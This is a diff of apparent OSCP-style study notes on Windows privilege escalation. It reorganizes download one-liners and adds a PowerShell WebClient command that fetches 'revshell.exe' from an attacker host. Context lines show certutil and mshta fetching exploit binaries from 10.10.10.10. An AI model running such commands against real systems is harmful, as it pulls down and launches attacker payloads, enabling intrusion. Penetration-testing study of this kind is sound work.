@@ -8,9 +8,6 @@ https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.htm
 
 Windows-Privesc-Check
 
-download file
-powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
-
 Usage:
 windows-privesc-check2.exe --audit -a -o wpc-report
 
@@ -57,5 +54,9 @@ certutil.exe -urlcache -split -f http[:]//10.10.10.10/exploit.exe
 
 [mshta]
 mshta http[:]//10.10.10.10/badthings.exe
+
+Download file
+powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
+powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
 
 https://github.com/frizb/Windows-Privilege-Escalation
